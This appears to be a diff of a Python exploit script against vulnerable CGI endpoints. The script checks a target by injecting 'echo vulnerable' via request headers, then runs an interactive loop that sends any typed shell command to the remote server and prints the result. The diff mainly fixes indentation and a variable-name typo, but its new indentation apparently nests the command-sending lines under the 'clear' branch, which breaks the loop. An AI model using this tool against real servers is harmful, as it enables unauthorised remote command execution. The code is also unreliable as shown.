@@ -28,14 +28,15 @@ def getreq(url, command):
     request = req.get(url, headers=headers)
     return request.text
 
+
 def isvulnerable(url):
     response = getreq(url, 'echo vulnerable')
     if 'vulnerable' in response:
         print("\n[\033[92m+\033[0m] \033[92mTarget seems to be vulnerable.\033[0m \n")
         return True
-   print(
+    print(
         "\n[\033[91m-\033[0m] \033[91mTarget seems not to be vulnerable.\033[0m\n")
-   return False
+    return False
 
 
 def clearscrn():
@@ -55,15 +56,15 @@ print("""
 
 rhost = input("Provide the full URL to the CGI Script (Include http://): ")
 try:
-   if isvulnerable(rhosts):
-   while True:
-      cmd = input("$ ")
-      if cmd == 'exit':
-         break
-      elif cmd == 'clear':
-         clearscrn()
-      resp = getreq(rhost, cmd)
-      print(resp)
+    if isvulnerable(rhost):
+        while True:
+            cmd = input("$ ")
+            if cmd == 'exit':
+                break
+            elif cmd == 'clear':
+                clearscrn()
+                resp = getreq(rhost, cmd)
+                print(resp)
 
 except(req.exceptions.MissingSchema, req.exceptions.ConnectionError):
     print(
